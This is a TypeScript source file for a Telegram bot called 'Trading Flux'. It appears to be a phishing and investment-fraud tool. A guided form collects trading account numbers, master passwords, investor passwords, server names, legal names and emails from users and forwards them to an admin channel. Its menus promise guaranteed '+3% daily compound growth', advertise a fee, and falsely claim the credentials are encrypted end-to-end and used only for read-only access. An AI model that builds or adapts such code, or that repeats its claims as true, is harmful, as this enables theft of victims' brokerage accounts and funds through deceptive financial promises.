import { Bot, Context, InlineKeyboard } from "grammy";
import { getSession, updateSession, setStep, resetSession } from "../sessions";
import { buildAdminMessage, buildConfirmationMessage, buildFormPreview } from "../utils/format";
import { savePending } from "../pending";
import { handleDepositTextInput } from "./deposit";

const LOGO = `
┌─────────────────────────┐
│    📊  TRADING FLUX      │
│  Professional Account   │
│     Management          │
└─────────────────────────┘`;

function stepHeader(step: number, total: number, title: string): string {
  const filled = "●".repeat(step);
  const empty = "○".repeat(total - step);
  return `*${title}*\nProgress: ${filled}${empty}  [${step}/${total}]\n${"─".repeat(28)}`;
}

function mainMenuKeyboard(): InlineKeyboard {
  return new InlineKeyboard()
    .text("📝 Register Account", "menu_register").row()
    .text("📊 Live Balance", "menu_balance")
    .text("💰 Deposit", "menu_deposit").row()
    .text("💳 Pay Fee ($3)", "menu_fee")
    .text("❓ How It Works", "menu_howitworks").row()
    .text("💬 Support", "menu_support")
    .text("📋 My Status", "menu_status");
}

function cancelKeyboard(): InlineKeyboard {
  return new InlineKeyboard().text("❌ Cancel Form", "form_cancel");
}

async function sendMainMenu(ctx: Context, firstName?: string) {
  const greeting = firstName ? `Welcome back, *${firstName}*! 👋` : `Welcome to *Trading Flux*! 👋`;
  await ctx.reply(
    `${LOGO}\n\n${greeting}\n\n` +
    `🚀 *Your Professional MT4/MT5 Account Manager*\n\n` +
    `✅  +3% daily compound growth\n` +
    `✅  Managed by expert traders\n` +
    `✅  Real-time balance tracking\n` +
    `✅  Secure & transparent\n\n` +
    `${"─".repeat(28)}\nWhat would you like to do?`,
    { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() }
  );
}

export function registerFormHandlers(bot: Bot<Context>): void {

  bot.command("start", async (ctx) => {
    await resetSession(ctx.from!.id);
    await sendMainMenu(ctx, ctx.from?.first_name);
  });

  bot.command("help", async (ctx) => {
    await ctx.reply(
      `*📖 Trading Flux — Help Centre*\n${"─".repeat(28)}\n\n` +
      `*Commands:*\n▸ /start — Main menu\n▸ /register — Submit account\n▸ /balance — Live dashboard\n▸ /cancel — Exit current form\n▸ /help — This menu\n\n` +
      `*How Account Management Works:*\n① Submit your MT4/MT5 credentials\n② Our team reviews within 24 hours\n③ We activate your account\n④ Your balance grows +3%/day\n⑤ Track it live with /balance\n\n` +
      `${"─".repeat(28)}\n💡 Tip: Use the buttons for the best experience.`,
      { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("📝 Register Now", "menu_register").row().text("🏠 Main Menu", "menu_main") }
    );
  });

  bot.command("cancel", async (ctx) => {
    await resetSession(ctx.from!.id);
    await ctx.reply(`✅ *Form cancelled.*\n\nReturning you to the main menu.`, { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() });
  });

  bot.command("register", async (ctx) => {
    await resetSession(ctx.from!.id);
    await setStep(ctx.from!.id, "platform");
    await askPlatform(ctx);
  });

  bot.callbackQuery("menu_main", async (ctx) => {
    await ctx.answerCallbackQuery();
    await resetSession(ctx.from!.id);
    await sendMainMenu(ctx, ctx.from?.first_name);
  });

  bot.callbackQuery("menu_register", async (ctx) => {
    await ctx.answerCallbackQuery();
    await resetSession(ctx.from!.id);
    await setStep(ctx.from!.id, "platform");
    await askPlatform(ctx);
  });

  bot.callbackQuery("menu_howitworks", async (ctx) => {
    await ctx.answerCallbackQuery();
    await ctx.reply(
      `*📈 How Trading Flux Works*\n${"─".repeat(28)}\n\n` +
      `*Step 1 — Submit Your Account*\nProvide your MT4/MT5 login credentials securely through our guided form.\n\n` +
      `*Step 2 — Expert Review (24h)*\nOur team verifies your account details and sets up management.\n\n` +
      `*Step 3 — Activation*\nWe activate trading on your account with our proven strategy.\n\n` +
      `*Step 4 — Daily Growth*\nYour balance grows at +3% per day using compound interest.\n\n` +
      `*Step 5 — Live Tracking*\nUse /balance anytime to see your real-time balance.\n\n` +
      `${"─".repeat(28)}\n💰 *Example: $1,000 deposit*\n  Day 7:   \\$1,229.87\n  Day 30:  \\$2,427.26\n  Day 90:  \\$14,300.74`,
      { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("📝 Register Now", "menu_register").row().text("🏠 Main Menu", "menu_main") }
    );
  });

  bot.callbackQuery("menu_support", async (ctx) => {
    await ctx.answerCallbackQuery();
    await ctx.reply(
      `*💬 Trading Flux Support*\n${"─".repeat(28)}\n\nOur support team is available 24/7.\n\n` +
      `📋 *Common Questions:*\n\n▸ *How safe are my credentials?*\n  We use investor-only access for monitoring.\n\n` +
      `▸ *When does trading start?*\n  Within 24 hours of approval.\n\n` +
      `▸ *Can I withdraw anytime?*\n  Yes. Your account remains in your name.\n\n` +
      `▸ *What if I want to stop?*\n  Contact support and we'll remove access immediately.`,
      { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("📝 Start Registration", "menu_register").row().text("🏠 Main Menu", "menu_main") }
    );
  });

  bot.callbackQuery("menu_status", async (ctx) => {
    await ctx.answerCallbackQuery();
    await ctx.reply(
      `*📋 Your Account Status*\n${"─".repeat(28)}\n\nStatus: *⏳ Not Registered Yet*\n\nComplete the registration form to submit your MT4/MT5 account for management.`,
      { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("📝 Register Now", "menu_register").row().text("🏠 Main Menu", "menu_main") }
    );
  });

  bot.callbackQuery("form_cancel", async (ctx) => {
    await ctx.answerCallbackQuery("Cancelled");
    await resetSession(ctx.from!.id);
    await ctx.reply(`✅ *Form cancelled.*\n\nNo data was submitted.`, { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() });
  });

  bot.callbackQuery(/^platform_(MT4|MT5)$/, async (ctx) => {
    await ctx.answerCallbackQuery();
    const platform = ctx.match[1] as "MT4" | "MT5";
    await updateSession(ctx.from!.id, { platform, step: "broker" });
    await ctx.reply(
      stepHeader(2, 9, "🏦 Broker Name") + `\n\n✅ Platform: *${platform}*\n\nType the name of your broker:\n_e.g. IC Markets, Exness, XM, Pepperstone_`,
      { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
    );
  });

  bot.callbackQuery("submit_confirm", async (ctx) => {
    await ctx.answerCallbackQuery("⏳ Submitting...");
    const userId = ctx.from!.id;
    const session = await getSession(userId);

    await savePending(userId, session, ctx.from.username);

    try {
      await ctx.api.sendMessage(
        process.env.ADMIN_CHANNEL_ID!,
        buildAdminMessage(session, userId, ctx.from.username),
        {
          parse_mode: "HTML",
          reply_markup: new InlineKeyboard()
            .text("✅ Approve", `approve_${userId}`)
            .text("❌ Reject", `reject_${userId}`),
        }
      );
    } catch (e) {
      console.error("Admin channel error:", e);
    }

    await resetSession(userId);
    await ctx.reply(buildConfirmationMessage(session), {
      parse_mode: "Markdown",
      reply_markup: new InlineKeyboard()
        .text("📊 View My Balance Now", "menu_balance").row()
        .text("🏠 Main Menu", "menu_main"),
    });
  });

  bot.callbackQuery("submit_cancel", async (ctx) => {
    await ctx.answerCallbackQuery("Cancelled");
    await resetSession(ctx.from!.id);
    await ctx.reply(`❌ *Submission cancelled.*\n\nYour data was not saved.`, { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() });
  });

  bot.on("message:text", async (ctx) => {
    const userId = ctx.from!.id;
    const text = ctx.message.text.trim();
    if (text.startsWith("/")) return;

    const handledByDeposit = await handleDepositTextInput(ctx);
    if (handledByDeposit) return;

    const session = await getSession(userId);

    switch (session.step) {
      case "broker": {
        await updateSession(userId, { brokerName: text, step: "account_number" });
        await ctx.reply(
          stepHeader(3, 9, "🔢 Account Number") + `\n\n✅ Broker: *${text}*\n\nEnter your MT4/MT5 *account number* (login ID):\n_This is the numeric ID used to log into your trading platform._`,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }
      case "account_number": {
        if (!/^\d+$/.test(text)) {
          await ctx.reply(`⚠️ *Invalid format*\n\nAccount number must contain digits only.\nPlease try again:`, { parse_mode: "Markdown", reply_markup: cancelKeyboard() });
          return;
        }
        await updateSession(userId, { accountNumber: text, step: "password" });
        await ctx.reply(
          stepHeader(4, 9, "🔑 Main Password") + `\n\n✅ Account: \`${text}\`\n\nEnter your account's *main (master) password*:\n\n🔒 _Encrypted end-to-end. Never shared with third parties._`,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }
      case "password": {
        await updateSession(userId, { password: text, step: "investor_password" });
        await ctx.reply(
          stepHeader(5, 9, "👁 Investor Password") + `\n\n✅ Main password saved.\n\nEnter your *investor (read-only) password*:\n\nℹ️ _This gives us view-only access to monitor your trades without the ability to withdraw funds._`,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }
      case "investor_password": {
        await updateSession(userId, { investorPassword: text, step: "server_name" });
        await ctx.reply(
          stepHeader(6, 9, "🌐 Server Name") + `\n\n✅ Investor password saved.\n\nEnter your broker's *server name*:\n\n_Found on your MT4/MT5 login screen._\n_e.g._ \`ICMarkets-Live01\``,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }
      case "server_name": {
        await updateSession(userId, { serverName: text, step: "deposit" });
        await ctx.reply(
          stepHeader(7, 9, "💵 Account Balance") + `\n\n✅ Server: \`${text}\`\n\nWhat is your current account balance in *USD*?\n\n_Enter numbers only (e.g._ \`5000\`_)_`,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }
      case "deposit": {
        const amount = parseFloat(text.replace(/[^0-9.]/g, ""));
        if (isNaN(amount) || amount <= 0) {
          await ctx.reply(`⚠️ *Invalid amount*\n\nPlease enter a valid USD amount (e.g. \`1000\`):`, { parse_mode: "Markdown", reply_markup: cancelKeyboard() });
          return;
        }
        await updateSession(userId, { depositAmount: amount.toFixed(2), step: "full_name" });
        await ctx.reply(
          stepHeader(8, 9, "👤 Full Name") + `\n\n✅ Deposit: *$${amount.toLocaleString("en-US", { minimumFractionDigits: 2 })}*\n\nEnter your *full legal name*:`,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }
      case "full_name": {
        if (text.length < 3) {
          await ctx.reply(`⚠️ Please enter your full name (at least 3 characters):`, { reply_markup: cancelKeyboard() });
          return;
        }
        await updateSession(userId, { fullName: text, step: "email" });
        await ctx.reply(
          stepHeader(9, 9, "📧 Email Address") + `\n\n✅ Name: *${text}*\n\nEnter your *email address* for account notifications:`,
          { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
        );
        break;
      }
      case "email": {
        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(text)) {
          await ctx.reply(`⚠️ *Invalid email*\n\nPlease enter a valid address (e.g. \`john@example.com\`):`, { parse_mode: "Markdown", reply_markup: cancelKeyboard() });
          return;
        }
        const today = new Date().toISOString().split("T")[0];
        await updateSession(userId, { email: text, startDate: today, step: "confirm" });
        const updatedSession = await getSession(userId);
        await ctx.reply(buildFormPreview(updatedSession), {
          parse_mode: "Markdown",
          reply_markup: new InlineKeyboard()
            .text("✅ Confirm & Submit", "submit_confirm").row()
            .text("✏️ Edit (start over)", "menu_register")
            .text("❌ Cancel", "submit_cancel"),
        });
        break;
      }
      case "idle": {
        await ctx.reply(`👋 Use the menu below to get started.`, { reply_markup: mainMenuKeyboard() });
        break;
      }
    }
  });
}

async function askPlatform(ctx: Context) {
  await ctx.reply(
    stepHeader(1, 9, "🖥️ Trading Platform") + `\n\nSelect your trading platform:`,
    {
      parse_mode: "Markdown",
      reply_markup: new InlineKeyboard()
        .text("📊 MetaTrader 4  (MT4)", "platform_MT4").row()
        .text("📈 MetaTrader 5  (MT5)", "platform_MT5").row()
        .text("❌ Cancel", "form_cancel"),
    }
  );
}
